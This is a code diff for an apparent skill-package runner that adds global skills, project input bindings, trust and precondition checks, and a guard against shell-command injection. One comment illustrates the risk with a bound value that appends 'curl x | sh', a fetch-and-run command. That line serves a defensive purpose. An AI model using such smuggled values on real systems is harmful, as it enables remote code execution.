@@ -1,7 +1,14 @@
 import { spawnSync } from 'node:child_process';
 import fs from 'node:fs/promises';
 import path from 'node:path';
-import { assertSkillApproved } from './trust.js';
+import { parse as parseYaml } from 'yaml';
+import { globalSkillsRoot } from './paths.js';
+import { assertSkillApproved, assertBindingNotSelfApproved, readTrust } from './trust.js';
+import { resolveBinding, interpolate, assertPinned, type SkillBinding } from './bindings.js';
+import { checkPreconditions } from './preconditions.js';
+import { formatRunBanner } from './run-banner.js';
+import { loadConfig } from '../core/config.js';
+import type { ProjectConfig } from '../core/types.js';
 import {
   SAFE_SKILL_NAME, normalizeSkillFilePath, validateSkillName,
 } from '../core/skill-paths.js';
@@ -19,6 +26,14 @@ export type SkillEntrypoint =
       autoRun?: boolean;
     };
 
+export type SkillCapability = 'process' | 'network' | 'write' | 'publish' | 'delete';
+
+export interface SkillRequires {
+  capabilities?: SkillCapability[];
+  inputs?: Record<string, { description?: string; default?: string }>;
+  preconditions?: string[];
+}
+
 export interface SkillManifest {
   name: string;
   purpose: string;
@@ -27,6 +42,8 @@ export interface SkillManifest {
   version: number;
   createdAt: string;
   updatedAt: string;
+  requires?: SkillRequires;
+  provenance?: string;
 }
 
 export interface SkillFileInput {
@@ -41,6 +58,8 @@ export interface CreateSkillPackageInput {
   triggers?: string[];
   files?: SkillFileInput[];
   entrypoints?: Record<string, SkillEntrypoint>;
+  requires?: SkillRequires;
+  provenance?: string;
 }
 
 export interface SkillSummary {
@@ -49,12 +68,14 @@ export interface SkillSummary {
   triggers: string[];
   entrypoints: string[];
   path: string;
+  layer: 'project' | 'global';
 }
 
 export interface SkillPackage {
   manifest: SkillManifest;
   markdown: string;
   path: string;
+  layer?: 'project' | 'global';
 }
 
 export interface SkillRunAttempt {
@@ -116,8 +137,7 @@ function getSkillPackageDir(projectRoot: string, name: string): string {
   return path.join(getSkillsDir(projectRoot), name);
 }
 
-function resolveSkillFile(projectRoot: string, name: string, filePath: string): string {
-  const skillDir = getSkillPackageDir(projectRoot, name);
+function resolveSkillFile(skillDir: string, filePath: string): string {
   const normalized = normalizeSkillFilePath(filePath);
   const resolved = path.resolve(skillDir, ...normalized.split('/'));
   const relative = path.relative(skillDir, resolved);
@@ -156,6 +176,19 @@ function normalizeEntrypoints(entrypoints?: Record<string, SkillEntrypoint>): Re
   return normalized;
 }
 
+async function findManifestFile(skillDir: string): Promise<string | null> {
+  for (const file of ['skill.yaml', 'skill.yml', 'skill.json']) {
+    try {
+      const filePath = path.join(skillDir, file);
+      await fs.access(filePath);
+      return filePath;
+    } catch {
+      // ignore
+    }
+  }
+  return null;
+}
+
 export async function createSkillPackage(projectRoot: string, input: CreateSkillPackageInput): Promise<SkillPackage> {
   validateSkillName(input.name);
   const skillDir = getSkillPackageDir(projectRoot, input.name);
@@ -163,7 +196,7 @@ export async function createSkillPackage(projectRoot: string, input: CreateSkill
   // a second create of the same name replaced its SKILL.md and entrypoints, reported
   // "Successfully created", and did not bump the version, so a working skill could vanish
   // with no trace. Refuse instead; editing an existing skill is its own operation.
-  if (await fs.access(path.join(skillDir, 'skill.json')).then(() => true, () => false)) {
+  if (await findManifestFile(skillDir)) {
     throw new Error(
       `A skill named "${input.name}" already exists. Creating would overwrite it. ` +
       `Delete it first, or choose another name.`,
@@ -178,6 +211,8 @@ export async function createSkillPackage(projectRoot: string, input: CreateSkill
     version: 1,
     createdAt: now,
     updatedAt: now,
+    ...(input.requires ? { requires: input.requires } : {}),
+    provenance: input.provenance || 'authored locally',
   };
   const markdown = input.markdown || `# ${input.name}\n\nPurpose: ${input.purpose}\n`;
 
@@ -187,7 +222,7 @@ export async function createSkillPackage(projectRoot: string, input: CreateSkill
   for (const entrypoint of Object.values(manifest.entrypoints)) {
     if (entrypoint.type === 'script') {
       assertRunnableScriptPath(entrypoint.path);
-      resolveSkillFile(projectRoot, input.name, entrypoint.path);
+      resolveSkillFile(skillDir, entrypoint.path);
     }
   }
 
@@ -196,13 +231,13 @@ export async function createSkillPackage(projectRoot: string, input: CreateSkill
   await fs.writeFile(path.join(skillDir, 'skill.json'), JSON.stringify(manifest, null, 2), 'utf-8');
 
   for (const file of input.files || []) {
-    const target = resolveSkillFile(projectRoot, input.name, file.path);
+    const target = resolveSkillFile(skillDir, file.path);
     await fs.mkdir(path.dirname(target), { recursive: true });
     await fs.writeFile(target, file.content, 'utf-8');
     await fs.chmod(target, 0o755).catch(() => {});
   }
 
-  return { manifest, markdown, path: skillDir };
+  return { manifest, markdown, path: skillDir, layer: 'project' };
 }
 
 /**
@@ -212,7 +247,12 @@ export async function createSkillPackage(projectRoot: string, input: CreateSkill
  * disagree about what the agent had just approved.
  */
 async function readManifest(skillDir: string, expectedName: string): Promise<SkillManifest> {
-  const manifest = JSON.parse(await fs.readFile(path.join(skillDir, 'skill.json'), 'utf-8')) as SkillManifest;
+  const manifestPath = await findManifestFile(skillDir);
+  if (!manifestPath) {
+    throw new Error(`Skill package in "${expectedName}" is missing a manifest (skill.yaml or skill.json)`);
+  }
+  const raw = await fs.readFile(manifestPath, 'utf-8');
+  const manifest = (manifestPath.endsWith('.json') ? JSON.parse(raw) : parseYaml(raw)) as SkillManifest;
   validateSkillName(manifest.name);
   if (manifest.name !== expectedName) {
     throw new Error(
@@ -222,11 +262,11 @@ async function readManifest(skillDir: string, expectedName: string): Promise<Ski
   }
   manifest.entrypoints = normalizeEntrypoints(manifest.entrypoints);
   manifest.triggers = manifest.triggers || [];
+  manifest.provenance = manifest.provenance || 'authored locally';
   return manifest;
 }
 
-export async function listSkillPackages(projectRoot: string): Promise<SkillSummary[]> {
-  const skillsDir = getSkillsDir(projectRoot);
+async function listSkillsInDir(skillsDir: string, layer: 'project' | 'global'): Promise<SkillSummary[]> {
   let entries: string[];
   try {
     entries = await fs.readdir(skillsDir);
@@ -249,20 +289,47 @@ export async function listSkillPackages(projectRoot: string): Promise<SkillSumma
         triggers: manifest.triggers || [],
         entrypoints: Object.keys(manifest.entrypoints || {}),
         path: skillDir,
+        layer,
       });
     } catch {
       // Ignore incomplete skill directories; explicit reads report detailed errors.
     }
   }
+  return summaries;
+}
 
-  return summaries.sort((a, b) => a.name.localeCompare(b.name));
+export async function listSkillPackages(projectRoot: string): Promise<SkillSummary[]> {
+  const projectSummaries = await listSkillsInDir(getSkillsDir(projectRoot), 'project');
+  const globalSummaries = await listSkillsInDir(globalSkillsRoot(), 'global');
+
+  const projectNames = new Set(projectSummaries.map(s => s.name));
+  const effectiveGlobals = globalSummaries.filter(s => !projectNames.has(s.name));
+
+  const all = [...projectSummaries, ...effectiveGlobals];
+  return all.sort((a, b) => a.name.localeCompare(b.name));
 }
 
 export async function readSkillPackage(projectRoot: string, name: string): Promise<SkillPackage> {
-  const skillDir = getSkillPackageDir(projectRoot, name);
-  const manifest = await readManifest(skillDir, name);
-  const markdown = await fs.readFile(path.join(skillDir, 'SKILL.md'), 'utf-8');
-  return { manifest, markdown, path: skillDir };
+  validateSkillName(name);
+  const projectSkillDir = getSkillPackageDir(projectRoot, name);
+  const hasProject = await findManifestFile(projectSkillDir);
+  if (hasProject) {
+    const manifest = await readManifest(projectSkillDir, name);
+    const markdown = await fs.readFile(path.join(projectSkillDir, 'SKILL.md'), 'utf-8').catch(() => '');
+    return { manifest, markdown, path: projectSkillDir, layer: 'project' };
+  }
+
+  const globalSkillDir = path.join(globalSkillsRoot(), name);
+  const hasGlobal = await findManifestFile(globalSkillDir);
+  if (hasGlobal) {
+    const manifest = await readManifest(globalSkillDir, name);
+    const markdown = await fs.readFile(path.join(globalSkillDir, 'SKILL.md'), 'utf-8').catch(() => '');
+    return { manifest, markdown, path: globalSkillDir, layer: 'global' };
+  }
+
+  const manifest = await readManifest(projectSkillDir, name);
+  const markdown = await fs.readFile(path.join(projectSkillDir, 'SKILL.md'), 'utf-8').catch(() => '');
+  return { manifest, markdown, path: projectSkillDir, layer: 'project' };
 }
 
 /**
@@ -327,12 +394,6 @@ function scriptCommand(scriptPath: string, args: string[]): { command: string; a
   return { command: scriptPath, args };
 }
 
-function runScript(projectRoot: string, scriptPath: string, args: string[], env: NodeJS.ProcessEnv) {
-  const command = scriptCommand(scriptPath, args);
-  const child = spawnSync(command.command, command.args, spawnLimits(projectRoot, env));
-  return { child, commandText: [command.command, ...command.args].join(' ') };
-}
-
 function childToAttempt(entrypoint: string, commandText: string, child: ReturnType<typeof spawnSync>): SkillRunAttempt {
   return {
     entrypoint,
@@ -353,6 +414,41 @@ export async function runSkillPackage(
   const skill = await readSkillPackage(projectRoot, name);
   const attempts: SkillRunAttempt[] = [];
 
+  let config: ProjectConfig | null = null;
+  try {
+    config = await loadConfig(projectRoot);
+  } catch {
+    // Config not present or invalid
+  }
+  const binding: SkillBinding | undefined = config?.skills?.[name];
+
+  if (skill.layer === 'global') {
+    await assertBindingNotSelfApproved(projectRoot, name);
+    if (!binding) {
+      const bound = resolveBinding(skill.manifest, undefined);
+      if ('missing' in bound && bound.missing.length > 0) {
+        throw new Error(
+          `Skill "${name}" is a global skill and has not been bound in this project. Missing required input${bound.missing.length > 1 ? 's' : ''}: ${bound.missing.join(', ')}. Add "skills.${name}" to .knowl/config.json.`,
+        );
+      }
+      throw new Error(
+        `Skill "${name}" is a global skill and is not bound in this project. Bind it in .knowl/config.json under "skills.${name}" before running.`,
+      );
+    }
+  }
+
+  if (binding) {
+    assertPinned(skill.manifest, binding);
+  }
+
+  const bindingResult = resolveBinding(skill.manifest, binding);
+  if ('missing' in bindingResult) {
+    throw new Error(
+      `Skill "${name}" is missing required input${bindingResult.missing.length > 1 ? 's' : ''}: ${bindingResult.missing.join(', ')}. Bind in project config under "skills.${name}.inputs".`,
+    );
+  }
+  const inputValues = 'values' in bindingResult ? bindingResult.values : {};
+
   async function runNamed(nameToRun: string): Promise<SkillRunAttempt> {
     const entrypoint = skill.manifest.entrypoints[nameToRun];
     if (!entrypoint) {
@@ -370,19 +466,86 @@ export async function runSkillPackage(
       );
     }
 
+    // The same argument, applied to the mechanism global playbooks arrived with. A bound input
+    // spliced into a command STRING is syntax rather than a value: `deploy ${inputs.target}` with
+    // `target` bound to `staging; curl x | sh` is two commands, and the quoting that would make it
+    // one is the quoting the check above already refuses to guess.
+    //
+    // It matters more here than for runtime args, because a binding comes from a PROJECT's config.
+    // Without this, a repository could choose what an already-approved global playbook runs, and
+    // approval would no longer cover everything that decides the command. Script entrypoints take
+    // an args ARRAY and are unaffected -- which is why the documented example is one.
+    if (entrypoint.type === 'shell' && /\$\{inputs\./.test(entrypoint.command)) {
+      throw new Error(
+        `Skill "${name}" entrypoint "${nameToRun}" is a shell command and cannot interpolate `
+        + 'inputs safely: a bound value would be spliced into the command as syntax, and a project '
+        + 'binding decides that value. Read the inputs from KNOWL_SKILL_INPUT_<NAME> in the '
+        + 'command, or use a script entrypoint, whose arguments are passed as an array.',
+      );
+    }
+
     // A human approved these exact bytes for this entrypoint, or nothing runs. Checked here
     // rather than at the call sites because this is the only path that spawns a process.
-    await assertSkillApproved(projectRoot, name, nameToRun);
+    const trustRoot = skill.layer === 'global' ? globalSkillsRoot() : projectRoot;
+    await assertSkillApproved(trustRoot, name, nameToRun);
+    const trustRecord = await readTrust(trustRoot, name);
+    const approvedAt = trustRecord?.approvedAt ? trustRecord.approvedAt.slice(0, 10) : undefined;
+
+    // Check preconditions fail-closed
+    const rawPreconditions = skill.manifest.requires?.preconditions ?? [];
+    const interpolatedPreconditions = interpolate(rawPreconditions, inputValues);
+    const precondResult = await checkPreconditions(interpolatedPreconditions, { cwd: projectRoot });
+    if (!precondResult.ok) {
+      throw new Error(
+        `Precondition failed for skill "${name}": ${precondResult.failed} (${precondResult.reason})`,
+      );
+    }
 
     const env = skillEnvironment(projectRoot, skill);
-    const { child, commandText } = entrypoint.type === 'shell'
-      ? { child: runShell(projectRoot, entrypoint.command, env), commandText: entrypoint.command }
-      : runScript(
-          projectRoot,
-          resolveSkillFile(projectRoot, name, entrypoint.path),
-          [...(entrypoint.args || []), ...args],
-          env
-        );
+    // Bound inputs, so the refusal above names a route that exists. An environment value is read
+    // by the process rather than parsed by the shell that launched it, so a metacharacter in one
+    // is a character, not a command.
+    for (const [inputName, value] of Object.entries(inputValues)) {
+      env[`KNOWL_SKILL_INPUT_${inputName.replace(/[^A-Za-z0-9]/g, '_').toUpperCase()}`] = value;
+    }
+
+    let child: ReturnType<typeof spawnSync>;
+    let commandText: string;
+
+    if (entrypoint.type === 'shell') {
+      commandText = interpolate([entrypoint.command], inputValues)[0];
+      const banner = formatRunBanner({
+        name: skill.manifest.name,
+        layer: skill.layer,
+        version: skill.manifest.version,
+        approvedAt,
+        command: commandText,
+        cwd: projectRoot,
+        capabilities: skill.manifest.requires?.capabilities,
+        preconditions: interpolatedPreconditions,
+      });
+      console.log(banner);
+      child = runShell(projectRoot, commandText, env);
+    } else {
+      const scriptPath = resolveSkillFile(skill.path, entrypoint.path);
+      const combinedArgs = [...(entrypoint.args || []), ...args];
+      const interpolatedArgs = interpolate(combinedArgs, inputValues);
+      const cmd = scriptCommand(scriptPath, interpolatedArgs);
+      commandText = [cmd.command, ...cmd.args].join(' ');
+      const banner = formatRunBanner({
+        name: skill.manifest.name,
+        layer: skill.layer,
+        version: skill.manifest.version,
+        approvedAt,
+        command: commandText,
+        cwd: projectRoot,
+        capabilities: skill.manifest.requires?.capabilities,
+        preconditions: interpolatedPreconditions,
+      });
+      console.log(banner);
+      child = spawnSync(cmd.command, cmd.args, spawnLimits(projectRoot, env));
+    }
+
     const attempt = childToAttempt(nameToRun, commandText, child);
     attempts.push(attempt);
     return attempt;
